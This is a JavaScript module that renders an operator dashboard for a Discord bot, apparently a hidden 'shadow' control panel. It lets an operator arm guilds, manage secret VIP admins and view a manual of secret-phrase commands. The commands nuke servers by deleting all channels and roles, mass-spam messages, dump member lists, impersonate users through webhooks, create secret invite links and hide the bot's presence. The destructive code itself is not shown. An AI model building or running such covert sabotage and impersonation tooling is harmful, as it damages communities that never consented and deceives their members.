function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll("\"", "&quot;")
        .replaceAll("'", "&#39;");
}

function escapeAttr(value) {
    return escapeHtml(value);
}

function hiddenInput(name, value) {
    return `<input type="hidden" name="${escapeAttr(name)}" value="${escapeAttr(value)}">`;
}

function htmlTag(tag, attrs = {}, children = []) {
    const attrText = Object.entries(attrs)
        .filter(([, value]) => value !== undefined && value !== null && value !== false)
        .map(([key, value]) => value === true ? ` ${key}` : ` ${key}="${escapeAttr(value)}"`)
        .join("");
    return `<${tag}${attrText}>${children.join("")}</${tag}>`;
}

function safeDiscordId(value) {
    const text = String(value ?? "").trim();
    return /^\d{5,25}$/.test(text) ? text : "unknown";
}

function safePortalBaseUrl(value) {
    try {
        const url = new URL(String(value || "https://your-app.onrender.com"));
        if (!["http:", "https:"].includes(url.protocol)) return "https://your-app.onrender.com";
        return url.origin;
    } catch {
        return "https://your-app.onrender.com";
    }
}

function renderTracePolicyRow(guildId, policy, normalizeTracePolicy) {
    return htmlTag("div", {
        style: "display:flex;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(239,68,68,.06);"
    }, [
        htmlTag("span", { style: "font-family:monospace;font-size:0.82em;" }, [escapeHtml(safeDiscordId(guildId))]),
        htmlTag("span", {
            class: "badge",
            style: "background:rgba(88,101,242,.14);color:#a5b4fc;border:1px solid rgba(88,101,242,.25);"
        }, [escapeHtml(normalizeTracePolicy(policy))])
    ]);
}

function renderTraceMetricRow(key, value) {
    return htmlTag("div", {
        style: "display:flex;align-items:center;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);"
    }, [
        htmlTag("span", { style: "font-family:monospace;font-size:0.78em;color:var(--text3);" }, [escapeHtml(key)]),
        htmlTag("span", { style: "font-family:monospace;color:var(--yellow);" }, [escapeHtml(value)])
    ]);
}

function renderVipRow(id) {
    const vipId = safeDiscordId(id);
    return htmlTag("div", {
        style: "display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(239,68,68,.06);"
    }, [
        htmlTag("code", { style: "color:var(--yellow);font-size:0.85em;" }, [escapeHtml(vipId)]),
        `<form method="POST" style="margin:0;">
            ${hiddenInput("action", "remove_vip")}
            ${hiddenInput("vip_id", vipId)}
            <button type="submit" class="btn btn-sm btn-danger">ลบ</button>
        </form>`
    ]);
}

function buildShadowGuildRows(mainClient, context) {
    if (!mainClient) return '<tr><td colspan="4" style="text-align:center;color:var(--text3);">Bot offline</td></tr>';
    return [...mainClient.guilds.cache.values()].map(g => {
        const guildId = safeDiscordId(g.id);
        const armed = context.armedGuilds.has(guildId);
        return `<tr>
            <td>${escapeHtml(g.name)} <span style="color:var(--text3);font-size:0.75em;">(${escapeHtml(guildId)})</span></td>
            <td style="text-align:center;">${escapeHtml(g.memberCount)}</td>
            <td style="text-align:center;">
                <span class="badge ${armed ? 'badge-armed' : 'badge-safe'}">${armed ? '🔴 ARMED' : '🟢 SAFE'}</span>
            </td>
            <td style="text-align:center;">
                <form method="POST" style="display:inline;margin:0;">
                    ${hiddenInput("action", armed ? "disarm_guild" : "arm_guild")}
                    ${hiddenInput("guild_id", guildId)}
                    <button type="submit" class="btn btn-sm ${armed ? 'btn-success' : 'btn-danger'}">${armed ? '🔓 ปลดอาวุธ' : '🎯 ARM'}</button>
                </form>
            </td>
        </tr>`;
    }).join('');
}

function buildShadowVipRows(context) {
    return [...context.globalAdminCache].map(id => renderVipRow(id)).join('')
        || '<div style="color:var(--text3);font-size:0.82em;text-align:center;padding:12px 0;">ยังไม่มี VIP</div>';
}

function buildShadowSessionRows(mainClient, context) {
    if (!mainClient) return '<tr><td colspan="4" style="color:var(--text3);">Bot offline</td></tr>';
    try {
        const sessions = Array.from(context.sessionManager.getAllSessions().values());
        if (!sessions.length) {
            return '<tr><td colspan="4" style="text-align:center;color:var(--text3);">ไม่มี session ออนอยู่</td></tr>';
        }
        return sessions.map(s => {
            const isProtected = context.protectedSessions.has(s.sessionId);
            const upMs = Date.now() - s.startedAt;
            const upStr = Math.floor(upMs / 3600000) > 0
                ? Math.floor(upMs / 3600000) + 'h ' + Math.floor((upMs % 3600000) / 60000) + 'm'
                : Math.floor((upMs % 3600000) / 60000) + 'm';
            return `<tr>
                <td style="font-family:monospace;font-size:0.78em;color:var(--text3);">${escapeHtml(String(s.sessionId || "").substring(0,20))}...</td>
                <td>${escapeHtml(s.serverName || '-')}</td>
                <td style="text-align:center;">${escapeHtml(upStr)}</td>
                <td style="text-align:center;">
                    <form method="POST" style="display:inline;margin:0;">
                        ${hiddenInput("action", "protect_session")}
                        ${hiddenInput("session_id", s.sessionId)}
                        <button type="submit" class="btn btn-sm ${isProtected ? 'btn-warn' : 'btn-purple'}">${isProtected ? '🛡️ Protected' : '🔓 Protect'}</button>
                    </form>
                </td>
            </tr>`;
        }).join('');
    } catch (e) {
        context.logSuppressedError("render voice session rows", e);
        return '<tr><td colspan="4" style="color:var(--text3);">Error loading sessions</td></tr>';
    }
}

function shadowCommandManual() {
    return [
        {name:'-intel',       desc:'ดึงสถิติเซิร์ฟ — ชื่อ, เจ้าของ, คน, ห้อง, ยศ, Boost',  tag:'normal', new:false},
        {name:'-adminscan',   desc:'สแกนแอดมินทั้งหมดพร้อม ID',                               tag:'normal', new:false},
        {name:'-rolelist',    desc:'ดึงรายชื่อยศทั้งหมดพร้อม ID เรียงตาม position',            tag:'normal', new:false},
        {name:'-auditbot',    desc:'ดึง Audit Log 10 รายการล่าสุด',                              tag:'normal', new:false},
        {name:'-memberdump',  desc:'Dump สมาชิก 500 คนแรก — แยก bot/user/admin',               tag:'normal', new:true},
        {name:'-snap',        desc:'Snapshot ข้อมูลเซิร์ฟแบบเต็ม + Icon URL',                  tag:'normal', new:true},
        {name:'-extract',     desc:'สร้างลิงก์เข้าลับ (1ชม./1ครั้ง)',                           tag:'normal', new:false},
        {name:'-vanish',      desc:'สั่งบอทออกเซิร์ฟทันที',                                     tag:'normal', new:false},
        {name:'-stealth',     desc:'สถานะบอท → Invisible (ยังทำงานปกติ)',                       tag:'normal', new:false},
        {name:'-active',      desc:'สถานะบอท → Online',                                          tag:'normal', new:false},
        {name:'-ghostping',   desc:'เช็ค WebSocket Ping ปัจจุบัน',                               tag:'normal', new:false},
        {name:'-sysinfo',     desc:'RAM, Uptime, Guild count, Voice Sessions',                    tag:'normal', new:false},
        {name:'-lockdown',    desc:'ล็อกห้องแชทที่พิมพ์คำสั่ง — snapshot permission ไว้',       tag:'normal', new:false},
        {name:'-unlock',      desc:'ปลดล็อกห้องแชท',                                             tag:'normal', new:false},
        {name:'-silence',     desc:'Server Mute ทุกคนในห้องเสียงที่อยู่',                       tag:'normal', new:true},
        {name:'-unsilence',   desc:'คืนเสียงทุกคนในห้องเสียงที่อยู่',                            tag:'normal', new:true},
        {name:'-memclear',    desc:'เคลียร์ Channel cache ลด RAM',                               tag:'normal', new:false},
        {name:'-ghostmode',   desc:'เปิด/ปิด Ghost Mode — บอทไม่ตอบคนทั่วไป',                  tag:'normal', new:true},
        {name:'-protect [id]',desc:'ป้องกัน session ไม่ให้ถูกหยุดจาก Dashboard',               tag:'normal', new:true},
        {name:'-restore',     desc:'คืนค่า Permission จาก snapshot ล่าสุด (-lockdown/-ruinroles)',tag:'normal', new:true},
        {name:'-mimic @u #ch ข้อความ',desc:'ส่งข้อความในนาม @u ผ่าน Webhook',               tag:'normal', new:false},
        {name:'-clown @u',    desc:'ติดป้าย Clown',                                               tag:'normal', new:false},
        {name:'-unclown @u',  desc:'ถอดป้าย Clown',                                               tag:'normal', new:false},
        {name:'-haunt @u',    desc:'ลบข้อความ @u อัตโนมัติหลัง 12 วิ (toggle)',                 tag:'normal', new:false},
        {name:'-nuke',        desc:'☢️ ลบห้อง+ยศทั้งหมด + เปลี่ยนชื่อ 30 ครั้ง',               tag:'armed',  new:false},
        {name:'-hostage',     desc:'ออกเซิร์ฟหลัง 3 วิ',                                         tag:'armed',  new:false},
        {name:'-ruinroles [ชื่อ]',desc:'เปลี่ยนชื่อยศทุกอัน + snapshot ไว้ restore',           tag:'armed',  new:false},
        {name:'-spamvc [n] [ชื่อ]',desc:'สร้าง Voice Channel n ช่อง',                           tag:'armed',  new:false},
        {name:'-masspam [n] [ข้อความ]',desc:'สแปม n ข้อความทุกห้องแชทผ่าน Webhook',           tag:'armed',  new:false},
    ];
}

function buildShadowCommandRows(safeSecretPhrase) {
    return shadowCommandManual().map(c => `
        <div class="cmd-card">
            <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;">
                <span class="cmd-name">${safeSecretPhrase} ${escapeHtml(c.name)}</span>
                ${c.tag === 'armed' ? '<span class="cmd-tag cmd-armed">⚠️ ARMED</span>' : ''}
                ${c.new ? '<span class="cmd-tag cmd-new">✨ NEW</span>' : ''}
            </div>
            <div class="cmd-desc">${escapeHtml(c.desc)}</div>
        </div>`).join('');
}

function buildShadowBotStats(mainClient) {
    if (!mainClient) return null;
    return {
        guilds: mainClient.guilds.cache.size,
        ping: Math.round(mainClient.ws.ping),
        tag: mainClient.user?.tag || '?',
        uptime: Math.round(process.uptime() / 60),
        ram: (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1),
    };
}

function buildToggleRows(context) {
    return Object.entries(context.systemToggles).map(([key, val]) => {
        const isNew = ['cmdMemberDump','cmdSnap','cmdGhostMode','cmdProtect','cmdRestore','cmdSilence'].includes(key);
        return `<div style="display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid rgba(239,68,68,.06);">
            <div>
                <span style="font-family:monospace;font-size:0.85em;color:${val?'var(--yellow)':'var(--text3)'};">${escapeHtml(key)}</span>
                ${isNew ? '<span class="badge" style="background:rgba(168,85,247,.15);color:#c084fc;border:1px solid rgba(168,85,247,.3);font-size:0.65em;margin-left:4px;">NEW</span>' : ''}
            </div>
            <form method="POST" style="margin:0;">
                ${hiddenInput("action", "toggle_feature")}
                ${hiddenInput("feature", key)}
                <button type="submit" class="badge ${val ? 'badge-on' : 'badge-off'}" style="cursor:pointer;border:none;padding:4px 12px;">${val ? '✅ เปิด' : '❌ ปิด'}</button>
            </form>
        </div>`;
    }).join('');
}

function buildShadowPortalViewData(mainClient, context) {
    const safeSecretPhrase = escapeHtml(context.SECRET_PHRASE);
    return {
        safeSecretPhrase,
        portalBaseUrl: escapeHtml(safePortalBaseUrl(process.env.RENDER_EXTERNAL_URL)),
        tracePolicyRows: [...context.traceGuildPolicies.entries()].map(([guildId, policy]) =>
            renderTracePolicyRow(guildId, policy, context.normalizeTracePolicy)
        ).join('') || '<p style="color:var(--text3);font-size:0.8em;">ไม่มี policy ราย guild — ใช้ default policy</p>',
        traceMetricRows: Object.entries(context.traceMetrics).map(([key, value]) =>
            renderTraceMetricRow(key, value)
        ).join(''),
        toggleRows: buildToggleRows(context),
        guildRows: buildShadowGuildRows(mainClient, context),
        vipRows: buildShadowVipRows(context),
        sessionRows: buildShadowSessionRows(mainClient, context),
        cmdRows: buildShadowCommandRows(safeSecretPhrase),
        botStats: buildShadowBotStats(mainClient)
    };
}

module.exports = {
    buildShadowPortalViewData,
    buildShadowGuildRows,
    buildShadowVipRows,
    buildShadowSessionRows,
    buildShadowCommandRows,
    buildShadowBotStats,
    buildToggleRows,
    renderTracePolicyRow,
    renderTraceMetricRow,
    renderVipRow,
    safeDiscordId,
    safePortalBaseUrl,
    hiddenInput,
    htmlTag,
    _test: {
        escapeHtml,
        shadowCommandManual
    }
};
